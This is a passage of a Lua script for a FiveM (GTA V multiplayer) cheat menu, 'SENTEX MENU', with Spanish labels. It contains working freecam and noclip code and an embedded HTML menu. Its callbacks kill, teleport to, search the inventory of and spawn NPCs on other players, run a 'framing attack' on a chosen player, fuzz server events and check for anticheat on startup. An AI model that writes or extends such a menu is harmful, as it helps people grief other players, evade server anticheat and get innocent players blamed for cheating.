            if mx~=0 or my~=0 or mz~=0 then
                local len = math.sqrt(mx^2+my^2+mz^2)
                if len>0 then mx,my,mz = mx/len, my/len, mz/len end
                local fwd, right, up = _camVectors()
                local delta = (fwd*my) + (right*mx) + (up*mz)
                SetEntityCoords(ent, GetEntityCoords(ent) + delta*speed, false, false, false, false)
            end
            _w(0)
        else
            _w(500)
        end
    end
end)

-- ========== FREECAM ==========
local freecamActive = false
local freecamCam = nil
local freecamStartPos = nil
local freecamStartHeading = nil

local function StartFreecam()
    if freecamActive then return end
    local ped = PlayerPedId()
    freecamStartPos = GetEntityCoords(ped)
    freecamStartHeading = GetEntityHeading(ped)

    SetEntityVisible(ped, false, false)
    SetEntityInvincible(ped, true)
    FreezeEntityPosition(ped, true)

    freecamCam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    SetCamCoord(freecamCam, freecamStartPos.x, freecamStartPos.y, freecamStartPos.z + 0.5)
    SetCamRot(freecamCam, 0.0, 0.0, GetGameplayCamRot(2).z, 2)
    RenderScriptCams(true, true, 1000, true, true)

    freecamActive = true
    _notify("~b~Freecam ACTIVADA | WASD + Ratón | Shift veloz | Espacio/Ctrl altura | PAGEDOWN salir")
end

local function StopFreecam()
    if not freecamActive then return end
    RenderScriptCams(false, true, 1000, true, true)
    if freecamCam then DestroyCam(freecamCam, true) end
    freecamCam = nil

    local ped = PlayerPedId()
    SetEntityVisible(ped, true, false)
    SetEntityInvincible(ped, false)
    FreezeEntityPosition(ped, false)
    SetEntityCoords(ped, freecamStartPos.x, freecamStartPos.y, freecamStartPos.z, false, false, false, false)
    SetEntityHeading(ped, freecamStartHeading)

    freecamActive = false
    _notify("~b~Freecam DESACTIVADA")
end

Citizen.CreateThread(function()
    while true do
        if freecamActive and freecamCam then
            local speed = 5.0
            if IsControlPressed(0, 21) then speed = 15.0 end

            local rot = GetCamRot(freecamCam, 2)
            local pitch = math.rad(rot.x)
            local yaw = math.rad(rot.z)
            local cosP = math.cos(pitch)
            local sinP = math.sin(pitch)
            local cosY = math.cos(yaw)
            local sinY = math.sin(yaw)

            local forward = vector3(-sinY * cosP, cosY * cosP, sinP)
            local right = vector3(-cosY, -sinY, 0.0)
            local up = vector3(0.0, 0.0, 1.0)

            local move = vector3(0,0,0)
            if IsControlPressed(0, 32) then move = move + forward end
            if IsControlPressed(0, 33) then move = move - forward end
            if IsControlPressed(0, 34) then move = move + right end
            if IsControlPressed(0, 35) then move = move - right end
            if IsControlPressed(0, 22) then move = move + up end
            if IsControlPressed(0, 36) then move = move - up end

            if move.x ~= 0 or move.y ~= 0 or move.z ~= 0 then
                local len = math.sqrt(move.x^2 + move.y^2 + move.z^2)
                if len > 0 then move = move / len end
                local newPos = GetCamCoord(freecamCam) + move * speed
                SetCamCoord(freecamCam, newPos.x, newPos.y, newPos.z)
            end

            local mouseX = GetDisabledControlNormal(0, 1)
            local mouseY = GetDisabledControlNormal(0, 2)
            if math.abs(mouseX) > 0.01 or math.abs(mouseY) > 0.01 then
                local newPitch = rot.x - mouseY * 5.0
                if newPitch > 89.0 then newPitch = 89.0 end
                if newPitch < -89.0 then newPitch = -89.0 end
                local newYaw = rot.z - mouseX * 5.0
                SetCamRot(freecamCam, newPitch, 0.0, newYaw, 2)
            end

            _w(0)
        else
            _w(100)
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        if freecamActive then
            for _, key in ipairs({32,33,34,35,22,36,21,23,24,25,44,45}) do
                DisableControlAction(0, key, true)
            end
            _w(0)
        else
            _w(500)
        end
    end
end)

-- ========== HTML INCORPORADO PARA DUI ==========
local menuHTML = [[
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SENTEX MENU</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            background: transparent;
            font-family: 'Segoe UI', 'Montserrat', sans-serif;
            overflow: hidden;
        }
        .menu-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 750px;
            max-width: 90vw;
            background: linear-gradient(145deg, #0f1219 0%, #0a0c12 100%);
            border-radius: 20px;
            border: 1px solid rgba(0, 200, 255, 0.3);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(0,200,255,0.2);
            overflow: hidden;
            animation: fadeIn 0.2s ease-out;
            display: none;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -48%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
        .banner {
            width: 100%;
            height: 100px;
            overflow: hidden;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .banner img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: center;
        }
        .header {
            text-align: center;
            padding: 20px 20px 10px;
            background: linear-gradient(135deg, #0d1a2b 0%, #0a111f 100%);
            border-bottom: 1px solid rgba(0,200,255,0.3);
        }
        .header h1 {
            font-size: 32px;
            font-weight: 800;
            color: white;
            letter-spacing: 2px;
        }
        .header h1 span { color: #00c8ff; text-shadow: 0 0 8px rgba(0,200,255,0.5); }
        .version { font-size: 12px; color: #aaa; margin-top: 5px; }
        .tabs {
            display: flex;
            background: #0a0c12;
            border-bottom: 1px solid rgba(0,200,255,0.2);
            padding: 0 10px;
        }
        .tab-btn {
            background: transparent;
            border: none;
            color: #ccc;
            font-weight: 600;
            font-size: 13px;
            padding: 12px 16px;
            cursor: pointer;
            transition: 0.2s;
            letter-spacing: 1px;
        }
        .tab-btn:hover { color: white; background: rgba(0,200,255,0.1); }
        .tab-btn.active { color: #00c8ff; border-bottom: 2px solid #00c8ff; }
        .content {
            padding: 20px;
            max-height: 480px;
            overflow-y: auto;
        }
        .tab-pane { display: none; animation: fadeIn 0.2s; }
        .tab-pane.active { display: block; }
        .grid-2col {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .menu-btn {
            background: rgba(20,30,45,0.7);
            border: 1px solid rgba(0,200,255,0.3);
            color: #e0e0e0;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.15s;
            text-align: left;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .menu-btn:hover {
            background: rgba(0,200,255,0.2);
            border-color: #00c8ff;
            color: white;
            transform: translateX(4px);
        }
        .players-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .player-item {
            background: rgba(20,30,45,0.6);
            border: 1px solid rgba(0,200,255,0.2);
            border-radius: 10px;
            padding: 10px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
        }
        .player-name { font-weight: 600; }
        .player-actions { display: flex; gap: 8px; }
        .player-btn {
            background: rgba(0,0,0,0.5);
            border: none;
            color: #00c8ff;
            padding: 5px 10px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.1s;
        }
        .player-btn:hover { background: #00c8ff; color: #0a0c12; }
        .loading { text-align: center; color: #aaa; padding: 20px; }
        .footer {
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            border-top: 1px solid rgba(0,200,255,0.2);
            font-size: 11px;
            color: #777;
            background: #0a0c12;
        }
        .content::-webkit-scrollbar { width: 5px; }
        .content::-webkit-scrollbar-track { background: #1a1f2e; border-radius: 10px; }
        .content::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 10px; }
        @media (max-width: 600px) {
            .menu-container { width: 95vw; }
            .grid-2col { grid-template-columns: 1fr; }
            .tab-btn { padding: 10px 12px; font-size: 11px; }
            .header h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="menu-container" id="menuContainer">
        <div class="banner">
            <img src="https://raw.githubusercontent.com/Sentexz/sentexmodz/refs/heads/main/JV6Drrz.png" alt="Banner" onerror="this.style.display='none'">
        </div>
        <div class="header">
            <h1>SENTEX<span>MENU</span></h1>
            <p class="version">v3.6 Beta + EH</p>
        </div>
        <div class="tabs">
            <button class="tab-btn active" data-tab="self">SELF</button>
            <button class="tab-btn" data-tab="vehicle">VEHICLE</button>
            <button class="tab-btn" data-tab="player">PLAYERS</button>
            <button class="tab-btn" data-tab="map">MAP</button>
            <button class="tab-btn" data-tab="events">EVENTS</button>
            <button class="tab-btn" data-tab="protection">PROTECTION</button>
        </div>
        <div class="content">
            <div class="tab-pane active" id="tab-self">
                <div class="grid-2col">
                    <button class="menu-btn" data-action="curar">🚑 Curar</button>
                    <button class="menu-btn" data-action="revivirESX">💊 Revivir ESX</button>
                    <button class="menu-btn" data-action="revivirQB">💊 Revivir QB</button>
                    <button class="menu-btn" data-action="noclip">🌀 Noclip</button>
                    <button class="menu-btn" data-action="freecam">📷 Freecam</button>
                </div>
            </div>
            <div class="tab-pane" id="tab-vehicle">
                <div class="grid-2col">
                    <button class="menu-btn" data-action="spawnVeh">🚗 Spawn Vehicle</button>
                    <button class="menu-btn" data-action="cargarVeh">📦 Cargar Vehículo</button>
                    <button class="menu-btn" data-action="lanzarVeh">💥 Lanzar Vehículo</button>
                    <button class="menu-btn" data-action="repararVeh">🔧 Reparar</button>
                    <button class="menu-btn" data-action="flipVeh">🔄 Voltear</button>
                    <button class="menu-btn" data-action="limpiarVeh">🧼 Limpiar</button>
                    <button class="menu-btn" data-action="attachAllVeh">🔗 Enganchar Todos</button>
                    <button class="menu-btn" data-action="detachAllVeh">🔓 Soltar Todos</button>
                </div>
            </div>
            <div class="tab-pane" id="tab-player">
                <div class="players-list" id="playersList">Cargando jugadores...</div>
            </div>
            <div class="tab-pane" id="tab-map">
                <div class="grid-2col">
                    <button class="menu-btn" data-action="stuntBlock">🧱 Bloque Stunt</button>
                    <button class="menu-btn" data-action="stuntBlockAlt">🧱 Bloque Alt</button>
                    <button class="menu-btn" data-action="forest">🌲 Selva</button>
                    <button class="menu-btn" data-action="chairRain">🪑 Lluvia de Sillas</button>
                    <button class="menu-btn" data-action="safeMassVeh">🚘 5 Vehículos</button>
                    <button class="menu-btn" data-action="globalSmoke">💨 Humo Global</button>
                    <button class="menu-btn" data-action="dance">🕺 Todos a Bailar</button>
                    <button class="menu-btn" data-action="spawnRampa">📐 Rampa Persistente</button>
                </div>
            </div>
            <div class="tab-pane" id="tab-events">
                <div class="grid-2col">
                    <button class="menu-btn" data-action="eventHunter">🔍 Event Hunter</button>
                    <button class="menu-btn" data-action="framingList">🎭 Ataque Framing</button>
                </div>
            </div>
            <div class="tab-pane" id="tab-protection">
                <div class="grid-2col">
                    <button class="menu-btn" data-action="acChecker">🛡️ AC Checker</button>
                </div>
            </div>
        </div>
        <div class="footer">
            <span>.gg/sentexmodz</span>
            <span id="acStatus"></span>
        </div>
    </div>
    <script>
        const menuContainer = document.getElementById('menuContainer');
        const tabs = document.querySelectorAll('.tab-btn');
        const panes = document.querySelectorAll('.tab-pane');
        const playersDiv = document.getElementById('playersList');
        let currentTab = 'self';
        let players = [];

        function sendAction(action, data = {}) {
            fetch(`https://SENTEX/${action}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.error(e));
        }

        tabs.forEach(btn => {
            btn.addEventListener('click', () => {
                const tabId = btn.getAttribute('data-tab');
                currentTab = tabId;
                tabs.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                panes.forEach(p => p.classList.remove('active'));
                document.getElementById(`tab-${tabId}`).classList.add('active');
                if (tabId === 'player') refreshPlayers();
            });
        });

        function refreshPlayers() {
            fetch('https://SENTEX/getPlayers', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({})
            })
            .then(resp => resp.json())
            .then(data => {
                players = data;
                if (!players || players.length === 0) {
                    playersDiv.innerHTML = '<div class="loading">No hay jugadores conectados</div>';
                    return;
                }
                let html = '';
                players.forEach(p => {
                    html += `
                        <div class="player-item">
                            <span class="player-name">${escapeHtml(p.name)}</span>
                            <div class="player-actions">
                                <button class="player-btn" data-pid="${p.id}" data-action="inventory">🎒 Inv</button>
                                <button class="player-btn" data-pid="${p.id}" data-action="revive">💊 Revivir</button>
                                <button class="player-btn" data-pid="${p.id}" data-action="kill">💀 Matar</button>
                                <button class="player-btn" data-pid="${p.id}" data-action="teleport">📍 TP</button>
                                <button class="player-btn" data-pid="${p.id}" data-action="spawnnpc">👾 NPCs</button>
                                <button class="player-btn" data-pid="${p.id}" data-action="framing">🎭 Framing</button>
                            </div>
                        </div>
                    `;
                });
                playersDiv.innerHTML = html;
                document.querySelectorAll('.player-btn').forEach(btn => {
                    btn.addEventListener('click', (e) => {
                        const pid = parseInt(btn.getAttribute('data-pid'));
                        const action = btn.getAttribute('data-action');
                        sendAction(action, { pid: pid });
                    });
                });
            });
        }

        window.addEventListener('message', (event) => {
            const data = event.data;
            if (data.type === 'openMenu') {
                menuContainer.style.display = 'block';
                if (currentTab === 'player') refreshPlayers();
            } else if (data.type === 'closeMenu') {
                menuContainer.style.display = 'none';
            } else if (data.type === 'updateACStatus') {
                const acSpan = document.getElementById('acStatus');
                if (data.detected) {
                    acSpan.innerHTML = '⚠️ ANTICHEAT DETECTADO';
                    acSpan.style.color = '#ff5555';
                } else {
                    acSpan.innerHTML = '🛡️ SIN ANTICHEAT';
                    acSpan.style.color = '#55ff55';
                }
            } else if (data.type === 'updatePlayers') {
                if (currentTab === 'player') refreshPlayers();
            }
        });

        document.querySelectorAll('.menu-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const action = btn.getAttribute('data-action');
                sendAction(action);
            });
        });

        function escapeHtml(str) {
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                sendAction('closeMenu');
            }
        });
    </script>
</body>
</html>
]]

-- ========== CREAR LA VENTANA DUI ==========
local duiObject = nil
local duiHandle = nil
local isMenuVisible = false

function CreateMenuDUI()
    if duiObject then return end
    local dataUrl = "data:text/html;charset=utf-8," .. menuHTML
    duiObject = CreateDui(dataUrl, 750, 600)
    if duiObject then
        -- Esperar a que el DUI se cree
        Citizen.Wait(500)
        duiHandle = GetDuiHandle(duiObject)
        if duiHandle and duiHandle ~= 0 then
            print("[SENTEX] Ventana DUI creada correctamente.")
        else
            print("[SENTEX] Error: No se pudo obtener el handle del DUI.")
        end
    else
        print("[SENTEX] Error: No se pudo crear el DUI.")
    end
end

function ShowMenu(show)
    if not duiObject then
        CreateMenuDUI()
        if not duiObject then return end
    end
    if show then
        SetNuiFocus(true, true)
        SendNUIMessage({ type = 'openMenu' })
    else
        SetNuiFocus(false, false)
        SendNUIMessage({ type = 'closeMenu' })
    end
end

-- ========== MANEJADORES NUI ==========
RegisterNUICallback('getPlayers', function(data, cb)
    local players = {}
    for i=0,255 do
        if NetworkIsPlayerActive(i) then
            local ped = GetPlayerPed(i)
            if ped and ped ~= 0 then
                table.insert(players, { id = i, name = GetPlayerName(i) })
            end
        end
    end
    cb(players)
end)

RegisterNUICallback('inventory', function(data, cb) _abrirInventario(data.pid); cb('ok') end)
RegisterNUICallback('revive', function(data, cb) _revivirJugador(data.pid); cb('ok') end)
RegisterNUICallback('kill', function(data, cb) _matarJugador(data.pid); cb('ok') end)
RegisterNUICallback('teleport', function(data, cb) _teleportTo(data.pid); cb('ok') end)
RegisterNUICallback('spawnnpc', function(data, cb) _spawnNPCs(data.pid, _r(3,6)); cb('ok') end)
RegisterNUICallback('framing', function(data, cb) _framingAttack(data.pid); cb('ok') end)

RegisterNUICallback('curar', function(data, cb) _curar(); cb('ok') end)
RegisterNUICallback('revivirESX', function(data, cb) _revivirESX(); cb('ok') end)
RegisterNUICallback('revivirQB', function(data, cb) _revivirQB(); cb('ok') end)
RegisterNUICallback('noclip', function(data, cb)
    if freecamActive then _notify("~r~No puedes usar noclip en freecam") cb('ok') return end
    if _noclipActivo then _disableNoclip() else _noclipActivo = true; _notify("~b~Noclip ACTIVADO") end
    cb('ok')
end)
RegisterNUICallback('freecam', function(data, cb)
    if freecamActive then StopFreecam() else
        if _noclipActivo then _disableNoclip() end
        StartFreecam()
    end
    cb('ok')
end)
RegisterNUICallback('spawnVeh', function(data, cb) _spawnVeh(); cb('ok') end)
RegisterNUICallback('cargarVeh', function(data, cb) _cargarVeh(); cb('ok') end)
RegisterNUICallback('lanzarVeh', function(data, cb) _lanzarVeh(); cb('ok') end)
RegisterNUICallback('repararVeh', function(data, cb) _repararVeh(); cb('ok') end)
RegisterNUICallback('flipVeh', function(data, cb) _flipVeh(); cb('ok') end)
RegisterNUICallback('limpiarVeh', function(data, cb) _limpiarVeh(); cb('ok') end)
RegisterNUICallback('attachAllVeh', function(data, cb) _attachAllNearbyVehicles(); cb('ok') end)
RegisterNUICallback('detachAllVeh', function(data, cb) _detachAllVehicles(); cb('ok') end)
RegisterNUICallback('stuntBlock', function(data, cb) _spawnStuntBlock(); cb('ok') end)
RegisterNUICallback('stuntBlockAlt', function(data, cb) _spawnStuntBlockAlt(); cb('ok') end)
RegisterNUICallback('forest', function(data, cb) _createForest(); cb('ok') end)
RegisterNUICallback('chairRain', function(data, cb) _startChairRain(); cb('ok') end)
RegisterNUICallback('safeMassVeh', function(data, cb) _safeMassVehicleSpawn(); cb('ok') end)
RegisterNUICallback('globalSmoke', function(data, cb) _globalSmoke(); cb('ok') end)
RegisterNUICallback('dance', function(data, cb) _everyoneDance(); cb('ok') end)
RegisterNUICallback('spawnRampa', function(data, cb) _spawnRampa(); cb('ok') end)
RegisterNUICallback('eventHunter', function(data, cb) _startFuzzing(); cb('ok') end)
RegisterNUICallback('framingList', function(data, cb)
    _notify("~y~Selecciona un jugador desde la pestaña PLAYERS")
    cb('ok')
end)
RegisterNUICallback('acChecker', function(data, cb) _scanAC(); cb('ok') end)
RegisterNUICallback('closeMenu', function(data, cb)
    ShowMenu(false)
    cb('ok')
end)

-- ========== TECLA Y INICIALIZACIÓN ==========
local StartMenu = function()
    CreateMenuDUI()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)
            if IsControlJustReleased(0, 288) then -- F1
                if not isMenuVisible then
                    ShowMenu(true)
                    isMenuVisible = true
                else
                    ShowMenu(false)
                    isMenuVisible = false
                end
            end
        end
    end)

    Citizen.CreateThread(function()
        _notify("~b~[~s~SENTEX~b~]~s~ Inicializando...")
        Wait(2000)
        _scanAC()
        _notify("~b~[~s~SENTEX~b~]~s~ Listo. Presiona F1 para abrir el menú.")
    end)
end

return { Start = StartMenu }
